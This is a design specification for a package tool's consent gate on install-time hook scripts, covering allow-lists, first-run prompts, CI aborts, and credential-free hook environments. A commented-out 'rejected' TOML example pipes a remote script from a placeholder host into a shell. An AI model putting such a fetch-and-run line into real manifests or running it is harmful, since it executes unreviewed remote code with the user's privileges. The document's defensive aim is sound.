# Third-Party Code Consent {#root}

<status stage="spec" state="done"/>

@fact:installing-a-dependency-often-runs-its-own-code **Scope of this document.** Installing or building a dependency often
runs code that dependency shipped — hooks, lifecycle scripts, build
steps. @status:spec/done

@fact:scope-of-this-document This file defines *why* that code is third-party code that
needs a consent gate, *how* the gate works (an allow-list plus
first-run consent), *why* a non-interactive run aborts rather than
runs unseen code, *why* hooks are versioned reviewable files rather
than inline manifest strings, *why* secrets never enter a hook's
environment, and *how* the residual risk is recorded as a deliberate
stance. @status:impl/done

@fact:sibling-document-pointers It sits alongside the four laws in
[`SECRETS-HYGIENE-PROTOCOL.md`](SECRETS-HYGIENE-PROTOCOL.md). @status:impl/done

## Install-time code is third-party code {#third-party}

@fact:INSTALLING-EXECUTES-CODE-YOU-DID-NOT-WRITE When a package declares a script that runs at install or build time,
installing that package **executes code you did not write**, with your
user's privileges, on your machine. @status:spec/done

@fact:the-same-trust-surface-as-any-ecosystems-hooks This is the same trust surface as
a build script or a post-install hook in any package ecosystem: the
code can read your files, reach the network, and touch anything your
user account can. @status:spec/done

@fact:the-convenience-is-real-and-so-is-the-exposure The convenience — a package that prepares itself —
is real, and so is the exposure. @status:spec/done

@fact:the-gate-governs-until-content-inspection-exists The gate below is how the exposure is
governed until stronger content inspection exists. @status:impl/done

## The consent gate {#consent-gate}

@fact:consent-gate-lead Trust is governed cheaply by an **allow-list plus first-run consent**: @status:impl/done

- @fact:GATE-ALLOW-LISTED-PUBLISHERS-RUN-SILENTLY **Allow-listed publishers run silently.** A configured list of
  trusted package groups runs its hooks with no prompt. A team's own
  namespace, or a vendor it has audited and decided to trust, goes on
  the list. This is the escape hatch that keeps trusted, high-volume
  workflows friction-free. @status:impl/done
- @fact:GATE-EVERYONE-ELSE-GETS-FIRST-RUN-CONSENT **Everyone else gets first-run consent.** The first time a
  non-allow-listed package would run a hook, the tool prints **exactly
  what will run** — the phase, the script path, the publishing group —
  and asks for a yes/no. Declining skips the hook and marks the
  install as hooks-skipped: surfaced, never silent. @status:impl/done

| Publisher | Interactive run | Non-interactive / CI run |
|-----------|-----------------|--------------------------|
| @fact:ROW-GATE-ALLOW-LISTED Allow-listed @status:impl/done | Runs silently @status:impl/done | Runs silently @status:impl/done |
| @fact:ROW-GATE-NOT-ALLOW-LISTED Not allow-listed @status:impl/done | Prompts, showing the exact script @status:impl/done | **Aborts** unless an explicit opt-in flag is passed @status:impl/done |

## A non-interactive run aborts, never runs unseen {#ci-abort}

@fact:the-critical-cell-is-the-bottom-right The critical cell in that table is the bottom-right. @status:impl/done

@fact:NO-HUMAN-MEANS-THE-HOOK-IS-NOT-RUN-SILENTLY In a
non-interactive or CI run there is no human to answer the prompt — so
a non-allow-listed package's hook is **not** run silently. @status:impl/done

@fact:THE-INSTALL-ABORTS-WITH-A-HINT The install
**aborts**, with a hint to either allow-list the group or pass an
explicit opt-in flag. @status:impl/done

@fact:the-failure-mode-being-prevented The failure mode being prevented is a script executing unseen,
unreviewed third-party code by default, in an automated context where
no one is watching. @status:spec/done

@fact:SILENCE-NEVER-MEANS-YES Silence-means-yes is exactly wrong here: the safe
default when consent cannot be obtained is to **stop**, not to assume
approval. @status:impl/done

@fact:ci-abort-forces-the-decision-in-advance Making CI abort forces the trust decision to be made
explicitly and in advance — by putting the group on the allow-list or
passing the flag — rather than implicitly by a machine at 3 a.m. @status:impl/done

## Hooks are versioned files, not inline strings {#versioned-files}

@fact:A-HOOK-IS-A-VERSIONED-FILE-NOT-AN-INLINE-STRING A hook is a **script file, versioned in the package**, referenced by
path from the manifest — never an inline command string embedded in
the manifest: @status:impl/done

```toml
# Good — a reviewable, diffable, version-controlled file:
[hooks]
pre-install = "hooks/prepare"

# Rejected — an inline string that hides code in configuration:
# pre-install = "curl https://x.example/i.sh | sh"
```

@fact:an-inline-string-hides-code-and-resists-review An inline string **hides the code in the configuration file and
resists review**. @status:spec/done

@fact:inline-strings-are-skimmed-past-and-hard-to-diff It is easy to skim past in a manifest, hard to
diff meaningfully across versions, and it invites the one-liner that
pipes a remote script into a shell. @status:spec/done

@fact:a-versioned-file-is-auditable-and-diffable A versioned file is auditable
(you can read the whole thing), diffable (a changed hook shows up in
review like any other code change), and honest about the fact that it
is code. @status:spec/done

@fact:the-prompt-points-at-a-real-path The consent prompt can point at a real path, and the
reviewer can open it. @status:impl/done

## Secrets never enter a hook's environment {#no-secrets-in-env}

@fact:A-CREDENTIAL-IS-NEVER-PLACED-IN-A-HOOKS-ENVIRONMENT A credential is **never placed in the environment of a hook**. @status:impl/done

@fact:HOOKS-GET-A-DOCUMENTED-CREDENTIAL-FREE-ENVIRONMENT The
tool passes hooks a documented, credential-free environment — package
identity, the working directory, the phase name — and nothing more. @status:impl/done

@fact:NO-CREDENTIAL-IS-EXPORTED-TO-THIRD-PARTY-CODE
Publish tokens, registry credentials, provider keys: none of them are
exported into a process running third-party code. @status:impl/done

@fact:this-is-law-three-at-its-sharpest This is Law 3 of the protocol (sanctioned process boundaries) applied
to the sharpest case. @status:impl/done

@fact:a-hook-is-unreviewed-code-by-definition A hook is unreviewed third-party code by
definition; putting a secret in its environment hands the value to
exactly the code least entitled to it, on a path that was never one of
the sanctioned boundaries. @status:spec/done

@fact:THE-RULE-IS-ABSOLUTE-AND-NEEDS-NO-EXCEPTION The rule is absolute and needs no
exception: a hook that genuinely needs a credential is a design smell
to escalate to the human, not a reason to widen the environment. @status:impl/done

## The residual risk, recorded {#residual-risk}

@fact:THE-GATE-REDUCES-BUT-DOES-NOT-ELIMINATE-THE-RISK Even with the gate, running third-party install-time code is a real
risk that the allow-list and consent prompt **reduce but do not
eliminate**. @status:spec/done

@fact:a-trusted-publisher-or-a-hasty-human-can-still-fail An allow-listed publisher you trusted can ship a
compromised hook; a human clicking through a first-run prompt can
approve something they did not fully read. @status:spec/done

@fact:THE-RESIDUAL-RISK-IS-RECORDED-AS-A-DELIBERATE-STANCE This residual risk is **recorded as a deliberate, written stance**,
not left as an unstated gap. @status:impl/done

@fact:THE-PROJECTS-POSITION-ON-HOOK-EXECUTION The project's position is: until an
automated content-inspection gate exists, hook execution is an
explicitly accepted risk governed by the allow-list plus consent, and
that acceptance is documented here so it is a decision on the record
rather than an oversight. @status:impl/done

@fact:WHEN-UNCERTAIN-TREAT-AS-UNTRUSTED-AND-ASK When uncertain whether a given publisher or
hook is safe, the conservative default applies — treat it as untrusted
and ask the human. @status:impl/done

## Summary {#summary}

- @fact:SUM-HOOKS-ARE-THIRD-PARTY-CODE Install/build hooks are third-party code running with your
  privileges — a real trust surface. @status:spec/done
- @fact:SUM-THE-GATE-IS-ALLOW-LIST-PLUS-CONSENT The gate: allow-listed publishers run silently; everyone else gets
  first-run consent showing the exact script. @status:impl/done
- @fact:SUM-CI-ABORTS-AND-SILENCE-NEVER-MEANS-YES A non-interactive/CI run **aborts** rather than running unseen code;
  silence never means yes. @status:impl/done
- @fact:SUM-HOOKS-ARE-VERSIONED-FILES Hooks are versioned, reviewable files referenced by path — never
  inline manifest strings that hide code and resist review. @status:impl/done
- @fact:SUM-NO-SECRET-IN-A-HOOKS-ENVIRONMENT A secret is never placed in a hook's environment (Law 3 at its
  sharpest). @status:impl/done
- @fact:SUM-THE-RESIDUAL-RISK-IS-RECORDED The residual risk is accepted deliberately and recorded here, not
  left unstated; when in doubt, treat as untrusted and ask. @status:impl/done
